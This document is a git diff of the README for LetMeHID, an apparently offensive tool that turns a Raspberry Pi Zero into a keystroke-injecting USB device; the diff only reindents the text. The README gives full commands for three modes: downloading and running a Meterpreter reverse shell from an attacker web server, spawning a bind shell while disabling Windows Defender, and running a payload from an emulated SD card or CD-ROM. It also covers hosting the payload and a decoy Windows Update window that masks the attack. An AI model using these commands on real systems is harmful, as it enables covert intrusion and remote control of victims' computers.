@@ -57,69 +57,77 @@ Some juicy features has been added to LetMeHID in order to increase the success 
 ### Download and execute (best option if the HTTP/HTTPS connections from victim to us are not blocked)
 
 **Full command:**  
-python LetMeHID.py --layout it --attack downloadAndExecute --start waitLED --httpServerAddress 192.168.1.254 --httpServerPort 8485 --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess
+
+	python LetMeHID.py --layout it --attack downloadAndExecute --start waitLED --httpServerAddress 192.168.1.254 --httpServerPort 8485 --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess
 
 **Details:**  
-python LetMeHID.py --layout it --attack downloadAndExecute  ->  *Italian keyboard layout, downloadAndExecute attack*  
---start waitLED  ->  *Start when the keyboard is installed by the system*  
---httpServerAddress 192.168.1.254 --httpServerPort 8485  ->  *The payload will be served at 192.168.1.254:8485, default path /enc_pay.txt, default protocol HTTP*  
---type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
---generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
---fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  
+
+	python LetMeHID.py --layout it --attack downloadAndExecute  ->  *Italian keyboard layout, downloadAndExecute attack*  
+	--start waitLED  ->  *Start when the keyboard is installed by the system*  
+	--httpServerAddress 192.168.1.254 --httpServerPort 8485  ->  *The payload will be served at 192.168.1.254:8485, default path /enc_pay.txt, default protocol HTTP*  
+	--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
+	--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
+	--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  
 
 **Pre-requisites:**  
-\# Set up a web server  
-mkdir /tmp/webserver/  
-cp ./enc_pay.txt /tmp/webserver/  
-cd /tmp/webserver/  
-python2 -m SimpleHTTPServer 8485  
+
+	\# Set up a web server  
+	mkdir /tmp/webserver/  
+	cp ./enc_pay.txt /tmp/webserver/  
+	cd /tmp/webserver/  
+	python2 -m SimpleHTTPServer 8485  
 
 #### Direct execution (this attack does not require anything but print a lot of thing on powershell and consequently is more detectable)
 
-**Full command:**  
-python LetMeHID.py --layout it --attack direct --start waitLED --type bind --port 5555 --admin --disableDefender  
+**Full command:** 
+
+	python LetMeHID.py --layout it --attack direct --start waitLED --type bind --port 5555 --admin --disableDefender  
 
 **Details:**  
-python LetMeHID.py --layout it --attack direct  ->  *Italian keyboard layout, direct attack*  
---start waitLEDRepeat  ->  *the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK*  
---type bind --port 5555  ->  *Bind shell payload, Meterpreter listener at local port 5555*  
---admin --disableDefender  ->  *Try to run powershell as Administrator* and then to disable Defender before running meterpreter payload*  
+
+	python LetMeHID.py --layout it --attack direct  ->  *Italian keyboard layout, direct attack*  
+	--start waitLEDRepeat  ->  *the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK*  
+	--type bind --port 5555  ->  *Bind shell payload, Meterpreter listener at local port 5555*  
+	--admin --disableDefender  ->  *Try to run powershell as Administrator* and then to disable Defender before running meterpreter payload*  
 
 ### Execute from PI0 internal SD card or CD Rom drive
 
 **Full command:**  
-python LetMeHID.py --layout it --start fixedTime --fixedTime 60000 --attack executeFromSd --driveName Keyboard --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess  
+
+	python LetMeHID.py --layout it --start fixedTime --fixedTime 60000 --attack executeFromSd --driveName Keyboard --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess  
 
 **Details:**  
-python LetMeHID.py --layout it --attack executeFromSd ->  *Italian keyboard layout, executeFromSd attack*  
---start fixedTime --fixedTime 60000  ->  *Run payload after 60 seconds*  
---driveName Keyboard  ->  *The payload is retrieved from external drive/CD-rom named Keyboard, supplied from PI0, default file name enc_pay.txt*  
---type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
---generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
---fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  
+
+	python LetMeHID.py --layout it --attack executeFromSd ->  *Italian keyboard layout, executeFromSd attack*  
+	--start fixedTime --fixedTime 60000  ->  *Run payload after 60 seconds*  
+	--driveName Keyboard  ->  *The payload is retrieved from external drive/CD-rom named Keyboard, supplied from PI0, default file name enc_pay.txt*  
+	--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
+	--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
+	--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  
 
 **Pre-requisites for an external drive:**  
-\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
-scp enc_pay.txt root@172.24.0.1:/tmp/  
-ssh root@172.24.0.1  
-mkdir /tmp/sdcard/  
-mv /tmp/enc_pay.txt /tmp/sdcard/  
-cd /tmp/sdcard/  
-/usr/local/P4wnP1/helper/genimg -l Keyboard -s 32 -i /tmp/sdcard/ -o sd_met  
-\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow and select "sd_met" in "Image file to use", Confirm and Deploy  
+
+	\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
+	scp enc_pay.txt root@172.24.0.1:/tmp/  
+	ssh root@172.24.0.1  
+	mkdir /tmp/sdcard/  
+	mv /tmp/enc_pay.txt /tmp/sdcard/  
+	cd /tmp/sdcard/  
+	/usr/local/P4wnP1/helper/genimg -l Keyboard -s 32 -i /tmp/sdcard/ -o sd_met  
+	\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow and select "sd_met" in "Image file to use", Confirm and Deploy  
 
 **Pre-requisites for a CD-ROM drive:**  
-\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
-scp enc_pay.txt root@172.24.0.1:/tmp/  
-ssh root@172.24.0.1  
-mkdir /tmp/cdrom/  
-mv /tmp/enc_pay.txt /tmp/cdrom/  
-cd /tmp/cdrom/  
-/usr/local/P4wnP1/helper/genimg -c -l "Keyboard" -i /tmp/cdrom/ -o cd_met  
-\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow, enable "CD-Rom" and select "cd_met" in "Image file to use", Confirm and Deploy  
+
+	\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
+	scp enc_pay.txt root@172.24.0.1:/tmp/  
+	ssh root@172.24.0.1  
+	mkdir /tmp/cdrom/  
+	mv /tmp/enc_pay.txt /tmp/cdrom/  
+	cd /tmp/cdrom/  
+	/usr/local/P4wnP1/helper/genimg -c -l "Keyboard" -i /tmp/cdrom/ -o cd_met  
+	\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow, enable "CD-Rom" and select "cd_met" in "Image file to use", Confirm and Deploy  
 
 ## Detailed options
-
 
 	usage: LetMeHID.py [-h] --layout LAYOUT
 	                   [--attack {direct,downloadAndExecute,executeFromSd}]
